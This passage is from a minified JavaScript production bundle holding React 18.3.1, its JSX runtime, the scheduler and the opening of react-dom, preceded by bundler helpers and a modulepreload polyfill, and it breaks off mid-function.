var ed = (e) => {
    throw TypeError(e);
};
var Ma = (e, t, n) => t.has(e) || ed("Cannot " + n);
var P = (e, t, n) => (Ma(e, t, "read from private field"), n ? n.call(e) : t.get(e)),
    ee = (e, t, n) =>
        t.has(e)
            ? ed("Cannot add the same private member more than once")
            : t instanceof WeakSet
              ? t.add(e)
              : t.set(e, n),
    K = (e, t, n, r) => (Ma(e, t, "write to private field"), r ? r.call(e, n) : t.set(e, n), n),
    Te = (e, t, n) => (Ma(e, t, "access private method"), n);
var Ls = (e, t, n, r) => ({
    set _(o) {
        K(e, t, o, n);
    },
    get _() {
        return P(e, t, r);
    },
});
function by(e, t) {
    for (var n = 0; n < t.length; n++) {
        const r = t[n];
        if (typeof r != "string" && !Array.isArray(r)) {
            for (const o in r)
                if (o !== "default" && !(o in e)) {
                    const s = Object.getOwnPropertyDescriptor(r, o);
                    s && Object.defineProperty(e, o, s.get ? s : { enumerable: !0, get: () => r[o] });
                }
        }
    }
    return Object.freeze(Object.defineProperty(e, Symbol.toStringTag, { value: "Module" }));
}
(function () {
    const t = document.createElement("link").relList;
    if (t && t.supports && t.supports("modulepreload")) return;
    for (const o of document.querySelectorAll('link[rel="modulepreload"]')) r(o);
    new MutationObserver((o) => {
        for (const s of o)
            if (s.type === "childList")
                for (const i of s.addedNodes) i.tagName === "LINK" && i.rel === "modulepreload" && r(i);
    }).observe(document, { childList: !0, subtree: !0 });
    function n(o) {
        const s = {};
        return (
            o.integrity && (s.integrity = o.integrity),
            o.referrerPolicy && (s.referrerPolicy = o.referrerPolicy),
            o.crossOrigin === "use-credentials"
                ? (s.credentials = "include")
                : o.crossOrigin === "anonymous"
                  ? (s.credentials = "omit")
                  : (s.credentials = "same-origin"),
            s
        );
    }
    function r(o) {
        if (o.ep) return;
        o.ep = !0;
        const s = n(o);
        fetch(o.href, s);
    }
})();
function df(e) {
    return e && e.__esModule && Object.prototype.hasOwnProperty.call(e, "default") ? e.default : e;
}
var pf = { exports: {} },
    na = {},
    ff = { exports: {} },
    Y = {};
/**
 * @license React
 * react.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */ var ks = Symbol.for("react.element"),
    ky = Symbol.for("react.portal"),
    Cy = Symbol.for("react.fragment"),
    Ey = Symbol.for("react.strict_mode"),
    Ny = Symbol.for("react.profiler"),
    Py = Symbol.for("react.provider"),
    Ty = Symbol.for("react.context"),
    jy = Symbol.for("react.forward_ref"),
    Ry = Symbol.for("react.suspense"),
    Ay = Symbol.for("react.memo"),
    My = Symbol.for("react.lazy"),
    td = Symbol.iterator;
function _y(e) {
    return e === null || typeof e != "object"
        ? null
        : ((e = (td && e[td]) || e["@@iterator"]), typeof e == "function" ? e : null);
}
var mf = {
        isMounted: function () {
            return !1;
        },
        enqueueForceUpdate: function () {},
        enqueueReplaceState: function () {},
        enqueueSetState: function () {},
    },
    hf = Object.assign,
    gf = {};
function go(e, t, n) {
    (this.props = e), (this.context = t), (this.refs = gf), (this.updater = n || mf);
}
go.prototype.isReactComponent = {};
go.prototype.setState = function (e, t) {
    if (typeof e != "object" && typeof e != "function" && e != null)
        throw Error(
            "setState(...): takes an object of state variables to update or a function which returns an object of state variables."
        );
    this.updater.enqueueSetState(this, e, t, "setState");
};
go.prototype.forceUpdate = function (e) {
    this.updater.enqueueForceUpdate(this, e, "forceUpdate");
};
function yf() {}
yf.prototype = go.prototype;
function Mc(e, t, n) {
    (this.props = e), (this.context = t), (this.refs = gf), (this.updater = n || mf);
}
var _c = (Mc.prototype = new yf());
_c.constructor = Mc;
hf(_c, go.prototype);
_c.isPureReactComponent = !0;
var nd = Array.isArray,
    vf = Object.prototype.hasOwnProperty,
    Lc = { current: null },
    xf = { key: !0, ref: !0, __self: !0, __source: !0 };
function wf(e, t, n) {
    var r,
        o = {},
        s = null,
        i = null;
    if (t != null)
        for (r in (t.ref !== void 0 && (i = t.ref), t.key !== void 0 && (s = "" + t.key), t))
            vf.call(t, r) && !xf.hasOwnProperty(r) && (o[r] = t[r]);
    var a = arguments.length - 2;
    if (a === 1) o.children = n;
    else if (1 < a) {
        for (var l = Array(a), u = 0; u < a; u++) l[u] = arguments[u + 2];
        o.children = l;
    }
    if (e && e.defaultProps) for (r in ((a = e.defaultProps), a)) o[r] === void 0 && (o[r] = a[r]);
    return { $$typeof: ks, type: e, key: s, ref: i, props: o, _owner: Lc.current };
}
function Ly(e, t) {
    return { $$typeof: ks, type: e.type, key: t, ref: e.ref, props: e.props, _owner: e._owner };
}
function Oc(e) {
    return typeof e == "object" && e !== null && e.$$typeof === ks;
}
function Oy(e) {
    var t = { "=": "=0", ":": "=2" };
    return (
        "$" +
        e.replace(/[=:]/g, function (n) {
            return t[n];
        })
    );
}
var rd = /\/+/g;
function _a(e, t) {
    return typeof e == "object" && e !== null && e.key != null ? Oy("" + e.key) : t.toString(36);
}
function ii(e, t, n, r, o) {
    var s = typeof e;
    (s === "undefined" || s === "boolean") && (e = null);
    var i = !1;
    if (e === null) i = !0;
    else
        switch (s) {
            case "string":
            case "number":
                i = !0;
                break;
            case "object":
                switch (e.$$typeof) {
                    case ks:
                    case ky:
                        i = !0;
                }
        }
    if (i)
        return (
            (i = e),
            (o = o(i)),
            (e = r === "" ? "." + _a(i, 0) : r),
            nd(o)
                ? ((n = ""),
                  e != null && (n = e.replace(rd, "$&/") + "/"),
                  ii(o, t, n, "", function (u) {
                      return u;
                  }))
                : o != null &&
                  (Oc(o) &&
                      (o = Ly(
                          o,
                          n + (!o.key || (i && i.key === o.key) ? "" : ("" + o.key).replace(rd, "$&/") + "/") + e
                      )),
                  t.push(o)),
            1
        );
    if (((i = 0), (r = r === "" ? "." : r + ":"), nd(e)))
        for (var a = 0; a < e.length; a++) {
            s = e[a];
            var l = r + _a(s, a);
            i += ii(s, t, n, l, o);
        }
    else if (((l = _y(e)), typeof l == "function"))
        for (e = l.call(e), a = 0; !(s = e.next()).done; )
            (s = s.value), (l = r + _a(s, a++)), (i += ii(s, t, n, l, o));
    else if (s === "object")
        throw (
            ((t = String(e)),
            Error(
                "Objects are not valid as a React child (found: " +
                    (t === "[object Object]" ? "object with keys {" + Object.keys(e).join(", ") + "}" : t) +
                    "). If you meant to render a collection of children, use an array instead."
            ))
        );
    return i;
}
function Os(e, t, n) {
    if (e == null) return e;
    var r = [],
        o = 0;
    return (
        ii(e, r, "", "", function (s) {
            return t.call(n, s, o++);
        }),
        r
    );
}
function Iy(e) {
    if (e._status === -1) {
        var t = e._result;
        (t = t()),
            t.then(
                function (n) {
                    (e._status === 0 || e._status === -1) && ((e._status = 1), (e._result = n));
                },
                function (n) {
                    (e._status === 0 || e._status === -1) && ((e._status = 2), (e._result = n));
                }
            ),
            e._status === -1 && ((e._status = 0), (e._result = t));
    }
    if (e._status === 1) return e._result.default;
    throw e._result;
}
var ze = { current: null },
    ai = { transition: null },
    Dy = { ReactCurrentDispatcher: ze, ReactCurrentBatchConfig: ai, ReactCurrentOwner: Lc };
function Sf() {
    throw Error("act(...) is not supported in production builds of React.");
}
Y.Children = {
    map: Os,
    forEach: function (e, t, n) {
        Os(
            e,
            function () {
                t.apply(this, arguments);
            },
            n
        );
    },
    count: function (e) {
        var t = 0;
        return (
            Os(e, function () {
                t++;
            }),
            t
        );
    },
    toArray: function (e) {
        return (
            Os(e, function (t) {
                return t;
            }) || []
        );
    },
    only: function (e) {
        if (!Oc(e)) throw Error("React.Children.only expected to receive a single React element child.");
        return e;
    },
};
Y.Component = go;
Y.Fragment = Cy;
Y.Profiler = Ny;
Y.PureComponent = Mc;
Y.StrictMode = Ey;
Y.Suspense = Ry;
Y.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED = Dy;
Y.act = Sf;
Y.cloneElement = function (e, t, n) {
    if (e == null)
        throw Error("React.cloneElement(...): The argument must be a React element, but you passed " + e + ".");
    var r = hf({}, e.props),
        o = e.key,
        s = e.ref,
        i = e._owner;
    if (t != null) {
        if (
            (t.ref !== void 0 && ((s = t.ref), (i = Lc.current)),
            t.key !== void 0 && (o = "" + t.key),
            e.type && e.type.defaultProps)
        )
            var a = e.type.defaultProps;
        for (l in t) vf.call(t, l) && !xf.hasOwnProperty(l) && (r[l] = t[l] === void 0 && a !== void 0 ? a[l] : t[l]);
    }
    var l = arguments.length - 2;
    if (l === 1) r.children = n;
    else if (1 < l) {
        a = Array(l);
        for (var u = 0; u < l; u++) a[u] = arguments[u + 2];
        r.children = a;
    }
    return { $$typeof: ks, type: e.type, key: o, ref: s, props: r, _owner: i };
};
Y.createContext = function (e) {
    return (
        (e = {
            $$typeof: Ty,
            _currentValue: e,
            _currentValue2: e,
            _threadCount: 0,
            Provider: null,
            Consumer: null,
            _defaultValue: null,
            _globalName: null,
        }),
        (e.Provider = { $$typeof: Py, _context: e }),
        (e.Consumer = e)
    );
};
Y.createElement = wf;
Y.createFactory = function (e) {
    var t = wf.bind(null, e);
    return (t.type = e), t;
};
Y.createRef = function () {
    return { current: null };
};
Y.forwardRef = function (e) {
    return { $$typeof: jy, render: e };
};
Y.isValidElement = Oc;
Y.lazy = function (e) {
    return { $$typeof: My, _payload: { _status: -1, _result: e }, _init: Iy };
};
Y.memo = function (e, t) {
    return { $$typeof: Ay, type: e, compare: t === void 0 ? null : t };
};
Y.startTransition = function (e) {
    var t = ai.transition;
    ai.transition = {};
    try {
        e();
    } finally {
        ai.transition = t;
    }
};
Y.unstable_act = Sf;
Y.useCallback = function (e, t) {
    return ze.current.useCallback(e, t);
};
Y.useContext = function (e) {
    return ze.current.useContext(e);
};
Y.useDebugValue = function () {};
Y.useDeferredValue = function (e) {
    return ze.current.useDeferredValue(e);
};
Y.useEffect = function (e, t) {
    return ze.current.useEffect(e, t);
};
Y.useId = function () {
    return ze.current.useId();
};
Y.useImperativeHandle = function (e, t, n) {
    return ze.current.useImperativeHandle(e, t, n);
};
Y.useInsertionEffect = function (e, t) {
    return ze.current.useInsertionEffect(e, t);
};
Y.useLayoutEffect = function (e, t) {
    return ze.current.useLayoutEffect(e, t);
};
Y.useMemo = function (e, t) {
    return ze.current.useMemo(e, t);
};
Y.useReducer = function (e, t, n) {
    return ze.current.useReducer(e, t, n);
};
Y.useRef = function (e) {
    return ze.current.useRef(e);
};
Y.useState = function (e) {
    return ze.current.useState(e);
};
Y.useSyncExternalStore = function (e, t, n) {
    return ze.current.useSyncExternalStore(e, t, n);
};
Y.useTransition = function () {
    return ze.current.useTransition();
};
Y.version = "18.3.1";
ff.exports = Y;
var x = ff.exports;
const A = df(x),
    bf = by({ __proto__: null, default: A }, [x]);
/**
 * @license React
 * react-jsx-runtime.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */ var zy = x,
    Fy = Symbol.for("react.element"),
    Uy = Symbol.for("react.fragment"),
    $y = Object.prototype.hasOwnProperty,
    Hy = zy.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED.ReactCurrentOwner,
    By = { key: !0, ref: !0, __self: !0, __source: !0 };
function kf(e, t, n) {
    var r,
        o = {},
        s = null,
        i = null;
    n !== void 0 && (s = "" + n), t.key !== void 0 && (s = "" + t.key), t.ref !== void 0 && (i = t.ref);
    for (r in t) $y.call(t, r) && !By.hasOwnProperty(r) && (o[r] = t[r]);
    if (e && e.defaultProps) for (r in ((t = e.defaultProps), t)) o[r] === void 0 && (o[r] = t[r]);
    return { $$typeof: Fy, type: e, key: s, ref: i, props: o, _owner: Hy.current };
}
na.Fragment = Uy;
na.jsx = kf;
na.jsxs = kf;
pf.exports = na;
var c = pf.exports,
    Cf = { exports: {} },
    Je = {},
    Ef = { exports: {} },
    Nf = {};
/**
 * @license React
 * scheduler.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */ (function (e) {
    function t(N, T) {
        var L = N.length;
        N.push(T);
        e: for (; 0 < L; ) {
            var V = (L - 1) >>> 1,
                U = N[V];
            if (0 < o(U, T)) (N[V] = T), (N[L] = U), (L = V);
            else break e;
        }
    }
    function n(N) {
        return N.length === 0 ? null : N[0];
    }
    function r(N) {
        if (N.length === 0) return null;
        var T = N[0],
            L = N.pop();
        if (L !== T) {
            N[0] = L;
            e: for (var V = 0, U = N.length, q = U >>> 1; V < q; ) {
                var X = 2 * (V + 1) - 1,
                    ne = N[X],
                    fe = X + 1,
                    Z = N[fe];
                if (0 > o(ne, L))
                    fe < U && 0 > o(Z, ne) ? ((N[V] = Z), (N[fe] = L), (V = fe)) : ((N[V] = ne), (N[X] = L), (V = X));
                else if (fe < U && 0 > o(Z, L)) (N[V] = Z), (N[fe] = L), (V = fe);
                else break e;
            }
        }
        return T;
    }
    function o(N, T) {
        var L = N.sortIndex - T.sortIndex;
        return L !== 0 ? L : N.id - T.id;
    }
    if (typeof performance == "object" && typeof performance.now == "function") {
        var s = performance;
        e.unstable_now = function () {
            return s.now();
        };
    } else {
        var i = Date,
            a = i.now();
        e.unstable_now = function () {
            return i.now() - a;
        };
    }
    var l = [],
        u = [],
        d = 1,
        p = null,
        m = 3,
        f = !1,
        S = !1,
        v = !1,
        w = typeof setTimeout == "function" ? setTimeout : null,
        g = typeof clearTimeout == "function" ? clearTimeout : null,
        h = typeof setImmediate < "u" ? setImmediate : null;
    typeof navigator < "u" &&
        navigator.scheduling !== void 0 &&
        navigator.scheduling.isInputPending !== void 0 &&
        navigator.scheduling.isInputPending.bind(navigator.scheduling);
    function y(N) {
        for (var T = n(u); T !== null; ) {
            if (T.callback === null) r(u);
            else if (T.startTime <= N) r(u), (T.sortIndex = T.expirationTime), t(l, T);
            else break;
            T = n(u);
        }
    }
    function b(N) {
        if (((v = !1), y(N), !S))
            if (n(l) !== null) (S = !0), B(k);
            else {
                var T = n(u);
                T !== null && I(b, T.startTime - N);
            }
    }
    function k(N, T) {
        (S = !1), v && ((v = !1), g(j), (j = -1)), (f = !0);
        var L = m;
        try {
            for (y(T), p = n(l); p !== null && (!(p.expirationTime > T) || (N && !H())); ) {
                var V = p.callback;
                if (typeof V == "function") {
                    (p.callback = null), (m = p.priorityLevel);
                    var U = V(p.expirationTime <= T);
                    (T = e.unstable_now()), typeof U == "function" ? (p.callback = U) : p === n(l) && r(l), y(T);
                } else r(l);
                p = n(l);
            }
            if (p !== null) var q = !0;
            else {
                var X = n(u);
                X !== null && I(b, X.startTime - T), (q = !1);
            }
            return q;
        } finally {
            (p = null), (m = L), (f = !1);
        }
    }
    var C = !1,
        E = null,
        j = -1,
        _ = 5,
        M = -1;
    function H() {
        return !(e.unstable_now() - M < _);
    }
    function D() {
        if (E !== null) {
            var N = e.unstable_now();
            M = N;
            var T = !0;
            try {
                T = E(!0, N);
            } finally {
                T ? G() : ((C = !1), (E = null));
            }
        } else C = !1;
    }
    var G;
    if (typeof h == "function")
        G = function () {
            h(D);
        };
    else if (typeof MessageChannel < "u") {
        var O = new MessageChannel(),
            $ = O.port2;
        (O.port1.onmessage = D),
            (G = function () {
                $.postMessage(null);
            });
    } else
        G = function () {
            w(D, 0);
        };
    function B(N) {
        (E = N), C || ((C = !0), G());
    }
    function I(N, T) {
        j = w(function () {
            N(e.unstable_now());
        }, T);
    }
    (e.unstable_IdlePriority = 5),
        (e.unstable_ImmediatePriority = 1),
        (e.unstable_LowPriority = 4),
        (e.unstable_NormalPriority = 3),
        (e.unstable_Profiling = null),
        (e.unstable_UserBlockingPriority = 2),
        (e.unstable_cancelCallback = function (N) {
            N.callback = null;
        }),
        (e.unstable_continueExecution = function () {
            S || f || ((S = !0), B(k));
        }),
        (e.unstable_forceFrameRate = function (N) {
            0 > N || 125 < N
                ? console.error(
                      "forceFrameRate takes a positive int between 0 and 125, forcing frame rates higher than 125 fps is not supported"
                  )
                : (_ = 0 < N ? Math.floor(1e3 / N) : 5);
        }),
        (e.unstable_getCurrentPriorityLevel = function () {
            return m;
        }),
        (e.unstable_getFirstCallbackNode = function () {
            return n(l);
        }),
        (e.unstable_next = function (N) {
            switch (m) {
                case 1:
                case 2:
                case 3:
                    var T = 3;
                    break;
                default:
                    T = m;
            }
            var L = m;
            m = T;
            try {
                return N();
            } finally {
                m = L;
            }
        }),
        (e.unstable_pauseExecution = function () {}),
        (e.unstable_requestPaint = function () {}),
        (e.unstable_runWithPriority = function (N, T) {
            switch (N) {
                case 1:
                case 2:
                case 3:
                case 4:
                case 5:
                    break;
                default:
                    N = 3;
            }
            var L = m;
            m = N;
            try {
                return T();
            } finally {
                m = L;
            }
        }),
        (e.unstable_scheduleCallback = function (N, T, L) {
            var V = e.unstable_now();
            switch (
                (typeof L == "object" && L !== null
                    ? ((L = L.delay), (L = typeof L == "number" && 0 < L ? V + L : V))
                    : (L = V),
                N)
            ) {
                case 1:
                    var U = -1;
                    break;
                case 2:
                    U = 250;
                    break;
                case 5:
                    U = 1073741823;
                    break;
                case 4:
                    U = 1e4;
                    break;
                default:
                    U = 5e3;
            }
            return (
                (U = L + U),
                (N = { id: d++, callback: T, priorityLevel: N, startTime: L, expirationTime: U, sortIndex: -1 }),
                L > V
                    ? ((N.sortIndex = L),
                      t(u, N),
                      n(l) === null && N === n(u) && (v ? (g(j), (j = -1)) : (v = !0), I(b, L - V)))
                    : ((N.sortIndex = U), t(l, N), S || f || ((S = !0), B(k))),
                N
            );
        }),
        (e.unstable_shouldYield = H),
        (e.unstable_wrapCallback = function (N) {
            var T = m;
            return function () {
                var L = m;
                m = T;
                try {
                    return N.apply(this, arguments);
                } finally {
                    m = L;
                }
            };
        });
})(Nf);
Ef.exports = Nf;
var Vy = Ef.exports;
/**
 * @license React
 * react-dom.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */ var Wy = x,
    Ze = Vy;
function R(e) {
    for (var t = "https://reactjs.org/docs/error-decoder.html?invariant=" + e, n = 1; n < arguments.length; n++)
        t += "&args[]=" + encodeURIComponent(arguments[n]);
    return (
        "Minified React error #" +
        e +
        "; visit " +
        t +
        " for the full message or use the non-minified dev environment for full errors and additional helpful warnings."
    );
}
var Pf = new Set(),
    Zo = {};
function hr(e, t) {
    so(e, t), so(e + "Capture", t);
}
function so(e, t) {
    for (Zo[e] = t, e = 0; e < t.length; e++) Pf.add(t[e]);
}
var Jt = !(typeof window > "u" || typeof window.document > "u" || typeof window.document.createElement > "u"),
    xl = Object.prototype.hasOwnProperty,
    Ky =
        /^[:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD][:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD\-.0-9\u00B7\u0300-\u036F\u203F-\u2040]*$/,
    od = {},
    sd = {};
function Qy(e) {
    return xl.call(sd, e) ? !0 : xl.call(od, e) ? !1 : Ky.test(e) ? (sd[e] = !0) : ((od[e] = !0), !1);
}
function Gy(e, t, n, r) {
    if (n !== null && n.type === 0) return !1;
    switch (typeof t) {
        case "function":
        case "symbol":
            return !0;
        case "boolean":
            return r
                ? !1
                : n !== null
                  ? !n.acceptsBooleans
                  : ((e = e.toLowerCase().slice(0, 5)), e !== "data-" && e !== "aria-");
        default:
            return !1;
    }
}
function qy(e, t, n, r) {
    if (t === null || typeof t > "u" || Gy(e, t, n, r)) return !0;
    if (r) return !1;
    if (n !== null)
        switch (n.type) {
            case 3:
                return !t;
            case 4:
                return t === !1;
            case 5:
                return isNaN(t);
            case 6:
                return isNaN(t) || 1 > t;
        }
    return !1;
}
function Fe(e, t, n, r, o, s, i) {
    (this.acceptsBooleans = t === 2 || t === 3 || t === 4),
        (this.attributeName = r),
        (this.attributeNamespace = o),
        (this.mustUseProperty = n),
        (this.propertyName = e),
        (this.type = t),
        (this.sanitizeURL = s),
        (this.removeEmptyString = i);
}
var Pe = {};
"children dangerouslySetInnerHTML defaultValue defaultChecked innerHTML suppressContentEditableWarning suppressHydrationWarning style"
    .split(" ")
    .forEach(function (e) {
        Pe[e] = new Fe(e, 0, !1, e, null, !1, !1);
    });
[
    ["acceptCharset", "accept-charset"],
    ["className", "class"],
    ["htmlFor", "for"],
    ["httpEquiv", "http-equiv"],
].forEach(function (e) {
    var t = e[0];
    Pe[t] = new Fe(t, 1, !1, e[1], null, !1, !1);
});
["contentEditable", "draggable", "spellCheck", "value"].forEach(function (e) {
    Pe[e] = new Fe(e, 2, !1, e.toLowerCase(), null, !1, !1);
});
["autoReverse", "externalResourcesRequired", "focusable", "preserveAlpha"].forEach(function (e) {
    Pe[e] = new Fe(e, 2, !1, e, null, !1, !1);
});
"allowFullScreen async autoFocus autoPlay controls default defer disabled disablePictureInPicture disableRemotePlayback formNoValidate hidden loop noModule noValidate open playsInline readOnly required reversed scoped seamless itemScope"
    .split(" ")
    .forEach(function (e) {
        Pe[e] = new Fe(e, 3, !1, e.toLowerCase(), null, !1, !1);
    });
["checked", "multiple", "muted", "selected"].forEach(function (e) {
    Pe[e] = new Fe(e, 3, !0, e, null, !1, !1);
});
["capture", "download"].forEach(function (e) {
    Pe[e] = new Fe(e, 4, !1, e, null, !1, !1);
});
["cols", "rows", "size", "span"].forEach(function (e) {
    Pe[e] = new Fe(e, 6, !1, e, null, !1, !1);
});
["rowSpan", "start"].forEach(function (e) {
    Pe[e] = new Fe(e, 5, !1, e.toLowerCase(), null, !1, !1);
});
var Ic = /[\-:]([a-z])/g;
function Dc(e) {
    return e[1].toUpperCase();
}
"accent-height alignment-baseline arabic-form baseline-shift cap-height clip-path clip-rule color-interpolation color-interpolation-filters color-profile color-rendering dominant-baseline enable-background fill-opacity fill-rule flood-color flood-opacity font-family font-size font-size-adjust font-stretch font-style font-variant font-weight glyph-name glyph-orientation-horizontal glyph-orientation-vertical horiz-adv-x horiz-origin-x image-rendering letter-spacing lighting-color marker-end marker-mid marker-start overline-position overline-thickness paint-order panose-1 pointer-events rendering-intent shape-rendering stop-color stop-opacity strikethrough-position strikethrough-thickness stroke-dasharray stroke-dashoffset stroke-linecap stroke-linejoin stroke-miterlimit stroke-opacity stroke-width text-anchor text-decoration text-rendering underline-position underline-thickness unicode-bidi unicode-range units-per-em v-alphabetic v-hanging v-ideographic v-mathematical vector-effect vert-adv-y vert-origin-x vert-origin-y word-spacing writing-mode xmlns:xlink x-height"
    .split(" ")
    .forEach(function (e) {
        var t = e.replace(Ic, Dc);
        Pe[t] = new Fe(t, 1, !1, e, null, !1, !1);
    });
"xlink:actuate xlink:arcrole xlink:role xlink:show xlink:title xlink:type".split(" ").forEach(function (e) {
    var t = e.replace(Ic, Dc);
    Pe[t] = new Fe(t, 1, !1, e, "http://www.w3.org/1999/xlink", !1, !1);
});
["xml:base", "xml:lang", "xml:space"].forEach(function (e) {
    var t = e.replace(Ic, Dc);
    Pe[t] = new Fe(t, 1, !1, e, "http://www.w3.org/XML/1998/namespace", !1, !1);
});
["tabIndex", "crossOrigin"].forEach(function (e) {
    Pe[e] = new Fe(e, 1, !1, e.toLowerCase(), null, !1, !1);
});
Pe.xlinkHref = new Fe("xlinkHref", 1, !1, "xlink:href", "http://www.w3.org/1999/xlink", !0, !1);
["src", "href", "action", "formAction"].forEach(function (e) {
    Pe[e] = new Fe(e, 1, !1, e.toLowerCase(), null, !0, !0);
});
function zc(e, t, n, r) {
    var o = Pe.hasOwnProperty(t) ? Pe[t] : null;
    (o !== null
        ? o.type !== 0
        : r || !(2 < t.length) || (t[0] !== "o" && t[0] !== "O") || (t[1] !== "n" && t[1] !== "N")) &&
        (qy(t, n, o, r) && (n = null),
        r || o === null
            ? Qy(t) && (n === null ? e.removeAttribute(t) : e.setAttribute(t, "" + n))
            : o.mustUseProperty
              ? (e[o.propertyName] = n === null ? (o.type === 3 ? !1 : "") : n)
              : ((t = o.attributeName),
                (r = o.attributeNamespace),
                n === null
                    ? e.removeAttribute(t)
                    : ((o = o.type),
                      (n = o === 3 || (o === 4 && n === !0) ? "" : "" + n),
                      r ? e.setAttributeNS(r, t, n) : e.setAttribute(t, n))));
}
var sn = Wy.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED,
    Is = Symbol.for("react.element"),
    jr = Symbol.for("react.portal"),
    Rr = Symbol.for("react.fragment"),
    Fc = Symbol.for("react.strict_mode"),
    wl = Symbol.for("react.profiler"),
    Tf = Symbol.for("react.provider"),
    jf = Symbol.for("react.context"),
    Uc = Symbol.for("react.forward_ref"),
    Sl = Symbol.for("react.suspense"),
    bl = Symbol.for("react.suspense_list"),
    $c = Symbol.for("react.memo"),
    gn = Symbol.for("react.lazy"),
    Rf = Symbol.for("react.offscreen"),
    id = Symbol.iterator;
function No(e) {
    return e === null || typeof e != "object"
        ? null
        : ((e = (id && e[id]) || e["@@iterator"]), typeof e == "function" ? e : null);
}
var pe = Object.assign,
    La;
function Do(e) {
    if (La === void 0)
        try {
            throw Error();
        } catch (n) {
            var t = n.stack.trim().match(/\n( *(at )?)/);
            La = (t && t[1]) || "";
        }
    return (
        `
` +
        La +
        e
    );
}
var Oa = !1;
function Ia(e, t) {
    if (!e || Oa) return "";
    Oa = !0;
    var n = Error.prepareStackTrace;
    Error.prepareStackTrace = void 0;
    try {
        if (t)
            if (
                ((t = function () {
                    throw Error();
                }),
                Object.defineProperty(t.prototype, "props", {
                    set: function () {
                        throw Error();
                    },
                }),
                typeof Reflect == "object" && Reflect.construct)
            ) {
                try {
                    Reflect.construct(t, []);
                } catch (u) {
                    var r = u;
                }
                Reflect.construct(e, [], t);
            } else {
                try {
                    t.call();
                } catch (u) {
                    r = u;
                }
                e.call(t.prototype);
            }
        else {
            try {
                throw Error();
            } catch (u) {
                r = u;
            }
            e();
        }
    } catch (u) {
        if (u && r && typeof u.stack == "string") {
            for (
                var o = u.stack.split(`
`),
                    s = r.stack.split(`
`),
                    i = o.length - 1,
                    a = s.length - 1;
                1 <= i && 0 <= a && o[i] !== s[a];

            )
                a--;
            for (; 1 <= i && 0 <= a; i--, a--)
                if (o[i] !== s[a]) {
                    if (i !== 1 || a !== 1)
                        do
                            if ((i--, a--, 0 > a || o[i] !== s[a])) {
                                var l =
                                    `
` + o[i].replace(" at new ", " at ");
                                return (
                                    e.displayName &&
                                        l.includes("<anonymous>") &&
                                        (l = l.replace("<anonymous>", e.displayName)),
                                    l
                                );
                            }
                        while (1 <= i && 0 <= a);
                    break;
                }
        }
    } finally {
        (Oa = !1), (Error.prepareStackTrace = n);
    }
    return (e = e ? e.displayName || e.name : "") ? Do(e) : "";
}
function Xy(e) {
    switch (e.tag) {
        case 5:
            return Do(e.type);
        case 16:
            return Do("Lazy");
        case 13:
            return Do("Suspense");
        case 19:
            return Do("SuspenseList");
        case 0:
        case 2:
        case 15:
            return (e = Ia(e.type, !1)), e;
        case 11:
            return (e = Ia(e.type.render, !1)), e;
        case 1:
            return (e = Ia(e.type, !0)), e;
        default:
            return "";
    }
}
function kl(e) {
    if (e == null) return null;
    if (typeof e == "function") return e.displayName || e.name || null;
    if (typeof e == "string") return e;
    switch (e) {
        case Rr:
            return "Fragment";
        case jr:
            return "Portal";
        case wl:
            return "Profiler";
        case Fc:
            return "StrictMode";
        case Sl:
            return "Suspense";
        case bl:
            return "SuspenseList";
    }
    if (typeof e == "object")
        switch (e.$$typeof) {
            case jf:
                return (e.displayName || "Context") + ".Consumer";
            case Tf:
                return (e._context.displayName || "Context") + ".Provider";
            case Uc:
                var t = e.render;
                return (
                    (e = e.displayName),
                    e || ((e = t.displayName || t.name || ""), (e = e !== "" ? "ForwardRef(" + e + ")" : "ForwardRef")),
                    e
                );
            case $c:
                return (t = e.displayName || null), t !== null ? t : kl(e.type) || "Memo";
            case gn:
                (t = e._payload), (e = e._init);
                try {
                    return kl(e(t));
                } catch {}
        }
    return null;
}
function Yy(e) {
    var t = e.type;
    switch (e.tag) {
        case 24:
            return "Cache";
        case 9:
            return (t.displayName || "Context") + ".Consumer";
        case 10:
            return (t._context.displayName || "Context") + ".Provider";
        case 18:
            return "DehydratedFragment";
        case 11:
            return (
                (e = t.render),
                (e = e.displayName || e.name || ""),
                t.displayName || (e !== "" ? "ForwardRef(" + e + ")" : "ForwardRef")
            );
        case 7:
            return "Fragment";
        case 5:
            return t;
        case 4:
            return "Portal";
        case 3:
            return "Root";
        case 6:
            return "Text";
        case 16:
            return kl(t);
        case 8:
            return t === Fc ? "StrictMode" : "Mode";
        case 22:
            return "Offscreen";
        case 12:
            return "Profiler";
        case 21:
            return "Scope";
        case 13:
            return "Suspense";
        case 19:
            return "SuspenseList";
        case 25:
            return "TracingMarker";
        case 1:
        case 0:
        case 17:
        case 2:
        case 14:
        case 15:
            if (typeof t == "function") return t.displayName || t.name || null;
            if (typeof t == "string") return t;
    }
    return null;
}
function Dn(e) {
    switch (typeof e) {
        case "boolean":
        case "number":
        case "string":
        case "undefined":
            return e;
        case "object":
            return e;
        default:
            return "";
    }
}
function Af(e) {
    var t = e.type;
    return (e = e.nodeName) && e.toLowerCase() === "input" && (t === "checkbox" || t === "radio");
}
function Zy(e) {
    var t = Af(e) ? "checked" : "value",
        n = Object.getOwnPropertyDescriptor(e.constructor.prototype, t),
        r = "" + e[t];
